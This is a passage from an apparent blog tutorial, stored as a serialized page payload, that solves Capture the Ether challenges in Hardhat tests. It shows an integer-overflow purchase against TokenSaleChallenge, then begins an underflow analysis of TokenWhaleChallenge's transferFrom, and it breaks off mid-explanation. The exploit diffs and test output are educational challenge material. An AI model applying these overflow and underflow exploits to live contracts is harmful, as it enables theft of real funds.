finished successfully\n\n\n  TokenSaleChallenge\nOverflow: 415992086870360064\n    1) should return true if we steal all the contract's ether\n\n\n  0 passing (815ms)\n  1 failing\n\n  1) TokenSaleChallenge\n       should return true if we steal all the contract's ether:\n     Error: Transaction reverted without a reason string\n      at \u003CUnrecognizedContract\u003E.\u003Cunknown\u003E (0x5fbdb2315678afecb367f032d93f642f64180aa3)\n      at async HardhatNode._mineBlockWithPendingTxs (node_modules\u002Fhardhat\u002Fsrc\u002Finternal\u002Fhardhat-network\u002Fprovider\u002Fnode.ts:1651:23)\n      at async HardhatNode.mineBlock (node_modules\u002Fhardhat\u002Fsrc\u002Finternal\u002Fhardhat-network\u002Fprovider\u002Fnode.ts:458:16)\n      at async EthModule._sendTransactionAndReturnHash (node_modules\u002Fhardhat\u002Fsrc\u002Finternal\u002Fhardhat-network\u002Fprovider\u002Fmodules\u002Feth.ts:1496:18)\n      at async HardhatNetworkProvider.request (node_modules\u002Fhardhat\u002Fsrc\u002Finternal\u002Fhardhat-network\u002Fprovider\u002Fprovider.ts:117:18)\n      at async EthersProviderWrapper.send (node_modules\u002F@nomiclabs\u002Fhardhat-ethers\u002Fsrc\u002Finternal\u002Fethers-provider-wrapper.ts:13:20)\n"}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"There we go - if we send 415992086870360064 Wei as the value, we should trick the contract into giving us a huge number of tokens. Let's try that out:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,aS]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"diff --git a\u002Ftest\u002Fmath\u002Ftoken-sale-challenge.ts b\u002Ftest\u002Fmath\u002Ftoken-sale-challenge.ts\nindex 9f3e20a..9c11352 100644\n"},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:cH}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:cI}]},{type:a,value:"\n@@ -18,9 +18,14 @@ describe(\"TokenSaleChallenge\", function () {\n"},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      .buy(\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"        ethers.constants.MaxUint256.div(\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"          BigNumber.from(ethers.utils.parseEther(\"1\"))\n"}]},{type:b,tag:c,props:{className:[d,bs,af]},children:[{type:b,tag:c,props:{className:[d,p,af]},children:[{type:a,value:ay}]},{type:a,value:"        ).add(1)\n"}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"        ).add(1),\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"        {\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"          value: BigNumber.from(\"415992086870360064\"),\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"        }\n"}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      );\n"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:cJ}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:cK}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:bY},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:bZ}]}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"If we remove our logs from the contract and then run our test again, we'll see the following:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,bD]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"Compiling 1 file with 0.4.25\ncontracts\u002Fmath\u002FTokenSale.sol:7:5: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use \"constructor(...) { ... }\" instead.\n    function TokenSaleChallenge(address _player) public payable {\n    ^ (Relevant source part starts here and spans across multiple lines).\n\ncontracts\u002Fmath\u002FTokenSale.sol:7:33: Warning: Unused function parameter. Remove or comment out the variable name to silence this warning.\n    function TokenSaleChallenge(address _player) public payable {\n                                ^-------------^\n\nGenerating typings for: 1 artifacts in dir: typechain for target: ethers-v5\nSuccessfully generated 5 typings!\nSolidity compilation finished successfully\n\n\n  TokenSaleChallenge\nBigNumber { value: \"9999583930224367615134\" }\n    âœ“ should return true if we reduce the contract's ether below 1 (583ms)\n\n\n  1 passing (586ms)\n"}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Well - that definitely worked! We now have almost 10 sextillion tokens! The rest of the challenge is fairly simple. Unfortunately the contract only has 2 ether in it, so the vast majority of these tokens are of no use to us, but we can at least sell one of them and beat the challenge."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,aS]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"diff --git a\u002Ftest\u002Fmath\u002Ftoken-sale-challenge.ts b\u002Ftest\u002Fmath\u002Ftoken-sale-challenge.ts\nindex 9c11352..370f809 100644\n"},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:cH}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:cI}]},{type:a,value:"\n@@ -26,6 +26,9 @@ describe(\"TokenSaleChallenge\", function () {\n\n"},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:cJ}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,bs,af]},children:[{type:b,tag:c,props:{className:[d,p,af]},children:[{type:a,value:ay}]},{type:a,value:cK}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    const sellTx = await challenge.connect(player).sell(1);\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    await sellTx.wait();\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:cL}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:bY},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:bZ}]}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Run your test now and you'll see that it succeeds! One thing to note is that it should technically be possible to drain the contract completely, but we'll not get into that now - we'll explore ways to do that later on in the series."}]},{type:a,value:m},{type:b,tag:aC,props:{id:cn},children:[{type:b,tag:T,props:{href:cu,ariaHidden:ae,tabIndex:aD},children:[{type:b,tag:c,props:{className:[aE,aF]},children:[]}]},{type:a,value:bw}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Looking at our Smart Contract's code, we can see that the developer has got wise to our funny business with overflowing integers, and has added some further requirements to the transfer method."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"contracts\u002Fmath\u002FTokenWhaleChallenge.sol"}]},{type:b,tag:O,props:{className:[P,aG]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aH}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aI}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:aJ}]},{type:b,tag:c,props:{className:[d,aK,B]},children:[{type:a,value:aL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aM}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:bw}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" totalSupply"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bz}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bA}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:bh},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bz}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bA}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bz}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bA}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" allowance"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:z}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" name "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"Simple ERC20 Token\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:z}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" symbol "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"SET\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:"uint8"}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" decimals "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bo}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bw}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:bS},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:"\n        player "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:bS},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n        totalSupply "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:cM}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:b_},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:cM}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bi}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bj}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:bk}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bl}]},{type:a,value:bh},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:"1000000"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cN}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cO}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bE}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bE}]},{type:a,value:bt},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bF}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:bt},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:"internal"}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:b_},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bU}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:b_},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cC}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cP}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cO}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:bt},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:bt},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:aQ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:aQ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:D}]},{type:a,value:cQ},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:bh},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bF}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cN}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bE}]},{type:a,value:bb},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bE}]},{type:a,value:b$},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cS}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:b$},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:"\n        allowance"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:"spender"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cP}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:b$},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bG}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:bt},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:aQ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:aQ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:D}]},{type:a,value:cQ},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:bh},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"allowance"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:an}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n\n        allowance"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bU}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bF}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"However they have implemented the transferFrom method quite badly wrong. Notice that it calls the "},{type:b,tag:o,props:{},children:[{type:a,value:bF}]},{type:a,value:" method at the end, which "},{type:b,tag:cT,props:{},children:[{type:a,value:"always"}]},{type:a,value:" affects the balance of "},{type:b,tag:o,props:{},children:[{type:a,value:"msg.sender"}]},{type:a,value:", not the balance of the "},{type:b,tag:o,props:{},children:[{type:a,value:M}]},{type:a,value:" account. So as long as we can pass the checks in the "},{type:b,tag:o,props:{},children:[{type:a,value:bG}]},{type:a,value:" method, we can then exploit the fact that in the same way that integers can be overflowed back to 0, they can also be underflowed back to 2"},{type:b,tag:ao,props:{},children:[{type:a,value:bC}]},{type:a,value:"-1."}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"To do 